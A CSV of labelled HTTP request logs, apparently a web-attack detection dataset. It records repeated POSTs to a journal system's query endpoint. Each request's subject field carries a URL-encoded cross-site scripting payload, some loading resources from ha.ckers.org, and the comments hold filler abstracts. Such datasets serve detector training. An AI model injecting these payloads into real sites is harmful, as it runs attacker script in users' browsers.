request_id,timestamp,method,uri,query_string,query_params_json,host,user_agent,content_type,accept,referer,cookie_hash,authorization_type,x_forwarded_for,body_truncated,body_len_original,source_ip,source_port,server_ip,server_port,proto,pcap_file,tcp_flags,tcp_flags_str,response_status,response_headers_json,response_size,response_time_ms,response_body_truncated,response_body_len_original,headers_raw,label
f90b9c568c09e4e4123aeb6cc7e3a4ac,"Fri, 12 Jun 2026 07:50:44 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=9&wasNew=&submissionId=16&stageId=1,queryId=9&wasNew=&submissionId=16&stageId=1,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%26lt%3bBODY%20BACKGROUND%3d%5c%22javascript%26%23058%3balert('XSS')%5c%22%26gt%3b&comment=This%20study%20explores%20how%20autonomous%20vehicles%20will%20reshape%20urban%20infrastructure%20and%20traffic%20management%20systems%20in%20smart%20cities%2e&submitFormButton=,362,172.19.2.40,44340,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
8e1749a3e85adc1bebeb5e74f2c25fa6,"Fri, 12 Jun 2026 07:50:44 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=9&wasNew=&submissionId=16&stageId=1,queryId=9&wasNew=&submissionId=16&stageId=1,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%26lt%3bBODY%20ONLOAD%3dalert('XSS')%26gt%3b&comment=The%20article%20reviews%20data%20privacy%20regulations%20across%20different%20continents%20and%20their%20varying%20approaches%20to%20protecting%20consumer%20information%20online%2e&submitFormButton=,345,172.19.2.40,44382,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
975048a370e4f378a89ed0f19048409e,"Fri, 12 Jun 2026 07:50:44 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=9&wasNew=&submissionId=16&stageId=1,queryId=9&wasNew=&submissionId=16&stageId=1,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%26lt%3bIMG%20DYNSRC%3d%5c%22javascript%26%23058%3balert('XSS')%5c%22%26gt%3b&comment=A%20research%20paper%20examines%20the%20correlation%20between%20corporate%20social%20responsibility%20initiatives%20and%20long-term%20brand%20loyalty%20among%20millennial%20consumers%2e&submitFormButton=,383,172.19.2.40,44330,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
203720e02e0508f5ae9be87a6ad6c1ae,"Fri, 12 Jun 2026 07:50:44 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=9&wasNew=&submissionId=16&stageId=1,queryId=9&wasNew=&submissionId=16&stageId=1,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%26lt%3bIMG%20LOWSRC%3d%5c%22javascript%26%23058%3balert('XSS')%5c%22%26gt%3b&comment=This%20investigation%20analyzes%20microplastics%20contamination%20in%20freshwater%20ecosystems%20and%20proposes%20industrial%20filtration%20standards%20to%20prevent%20further%20pollution%2e&submitFormButton=,387,172.19.2.40,44344,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
20bd8242fb9d9ebd1d613d2739070ffd,"Fri, 12 Jun 2026 07:50:44 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=9&wasNew=&submissionId=16&stageId=1,queryId=9&wasNew=&submissionId=16&stageId=1,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%26lt%3bBGSOUND%20SRC%3d%5c%22javascript%26%23058%3balert('XSS')%3b%5c%22%26gt%3b&comment=The%20article%20discusses%20the%20potential%20of%20quantum%20computing%20in%20breaking%20current%20encryption%20standards%20and%20its%20implications%20for%20cybersecurity%2e&submitFormButton=,375,172.19.2.40,44360,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
9df65d6aba200b079826fd93bb9a7bd9,"Fri, 12 Jun 2026 07:50:44 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=9&wasNew=&submissionId=16&stageId=1,queryId=9&wasNew=&submissionId=16&stageId=1,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%26lt%3bBR%20SIZE%3d%5c%22%26%7balert('XSS')%7d%5c%22%26gt%3b&comment=A%20study%20on%20remote%20learning%20effectiveness%20during%20the%20pandemic%20reveals%20both%20advantages%20in%20accessibility%20and%20challenges%20with%20student%20engagement%20and%20equity%2e&submitFormButton=,376,172.19.2.40,44384,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
285e3c9c15680700ae0599e129649957,"Fri, 12 Jun 2026 07:50:45 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=9&wasNew=&submissionId=16&stageId=1,queryId=9&wasNew=&submissionId=16&stageId=1,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%26lt%3bLAYER%20SRC%3d%5c%22http%26%2358%3b%2f%2fha%26%2346%3bckers%26%2346%3borg%2fscriptlet%26%2346%3bhtml%5c%22%26gt%3b%26lt%3b%2fLAYER%26gt%3b&comment=This%20paper%20explores%20the%20role%20of%20women%20entrepreneurs%20in%20sustainable%20business%20innovation%20and%20barriers%20they%20face%20in%20securing%20venture%20capital%20funding%2e&submitFormButton=,455,172.19.2.40,44372,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
4d78aa07f656da8c292f30a2ba2b4656,"Fri, 12 Jun 2026 07:50:45 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=9&wasNew=&submissionId=16&stageId=1,queryId=9&wasNew=&submissionId=16&stageId=1,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%26lt%3bLINK%20REL%3d%5c%22stylesheet%5c%22%20HREF%3d%5c%22javascript%26%23058%3balert('XSS')%3b%5c%22%26gt%3b&comment=The%20research%20examines%20how%20augmented%20reality%20transforms%20customer%20shopping%20experiences%20and%20its%20impact%20on%20e-commerce%20conversion%20rates%2e&submitFormButton=,396,172.19.2.40,44368,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
b5daa7ba5fd2bfaef6b10c40ed2d99a4,"Fri, 12 Jun 2026 07:50:45 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=9&wasNew=&submissionId=16&stageId=1,queryId=9&wasNew=&submissionId=16&stageId=1,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%26lt%3bLINK%20REL%3d%5c%22stylesheet%5c%22%20HREF%3d%5c%22http%26%2358%3b%2f%2fha%26%2346%3bckers%26%2346%3borg%2fxss%26%2346%3bcss%5c%22%26gt%3b&comment=An%20analysis%20of%20antibiotic%20resistance%20patterns%20in%20hospital%20settings%20proposes%20new%20stewardship%20protocols%20to%20combat%20the%20rise%20of%20drug-resistant%20bacteria%2e&submitFormButton=,455,172.19.2.40,44380,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
f178a0502e73a2e39ce32cd84149160f,"Fri, 12 Jun 2026 07:50:45 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=9&wasNew=&submissionId=16&stageId=1,queryId=9&wasNew=&submissionId=16&stageId=1,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,"csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%26lt%3bSTYLE%26gt%3b@import'http%26%2358%3b%2f%2fha%26%2346%3bckers%26%2346%3borg%2fxss%26%2346%3bcss'%3b%26lt%3b%2fSTYLE%26gt%3b&comment=This%20article%20investigates%20the%20connection%20between%20inadequate%20sleep%20and%20chronic%20disease%20development,%20offering%20evidence-based%20sleep%20hygiene%20recommendations%2e&submitFormButton=",438,172.19.2.40,44330,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
22458b65104231d83a43a52d36c41abe,"Fri, 12 Jun 2026 07:50:45 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=9&wasNew=&submissionId=16&stageId=1,queryId=9&wasNew=&submissionId=16&stageId=1,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,"csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%26lt%3bMETA%20HTTP-EQUIV%3d%5c%22Link%5c%22%20Content%3d%5c%22%26lt%3bhttp%26%2358%3b%2f%2fha%26%2346%3bckers%26%2346%3borg%2fxss%26%2346%3bcss%26gt%3b%3b%20REL%3dstylesheet%5c%22%26gt%3b&comment=The%20paper%20reviews%20emerging%20technologies%20in%20waste%20management,%20including%20advanced%20recycling%20methods%20and%20decomposition%20acceleration%20techniques%2e&submitFormButton=",481,172.19.2.40,44340,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
c9ddbbde24aa8e8acba7544aec3aff6b,"Fri, 12 Jun 2026 07:50:45 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=9&wasNew=&submissionId=16&stageId=1,queryId=9&wasNew=&submissionId=16&stageId=1,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%26lt%3bSTYLE%26gt%3bBODY%7b-moz-binding%26%2358%3burl(%5c%22http%26%2358%3b%2f%2fha%26%2346%3bckers%26%2346%3borg%2fxssmoz%26%2346%3bxml%23xss%5c%22)%7d%26lt%3b%2fSTYLE%26gt%3b&comment=A%20comprehensive%20study%20on%20digital%20literacy%20programs%20in%20developing%20countries%20shows%20their%20correlation%20with%20improved%20economic%20opportunities%20and%20social%20mobility%2e&submitFormButton=,494,172.19.2.40,44390,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
f42036abaee61ac08d7b5a7fb13ea8f8,"Fri, 12 Jun 2026 07:50:45 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=9&wasNew=&submissionId=16&stageId=1,queryId=9&wasNew=&submissionId=16&stageId=1,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%26lt%3bXSS%20STYLE%3d%5c%22behavior%26%2358%3b%20url(xss%26%2346%3bhtc)%3b%5c%22%26gt%3b&comment=This%20research%20explores%20the%20therapeutic%20applications%20of%20psychedelic%20compounds%20in%20treating%20treatment-resistant%20depression%20and%20PTSD%20in%20clinical%20settings%2e&submitFormButton=,396,172.19.2.40,44382,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
fe9fa979e039b587572a2d789031a84c,"Fri, 12 Jun 2026 07:50:45 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=9&wasNew=&submissionId=16&stageId=1,queryId=9&wasNew=&submissionId=16&stageId=1,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%26lt%3bSTYLE%26gt%3bli%20%7blist-style-image%26%2358%3b%20url(%5c%22javascript%26%23058%3balert('XSS')%5c%22)%3b%7d%26lt%3b%2fSTYLE%26gt%3b%26lt%3bUL%26gt%3b%26lt%3bLI%26gt%3bXSS&comment=The%20article%20analyzes%20the%20influence%20of%20streaming%20platforms%20on%20traditional%20entertainment%20industries%20and%20shifts%20in%20consumer%20viewing%20habits%20globally%2e&submitFormButton=,483,172.19.2.40,44360,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
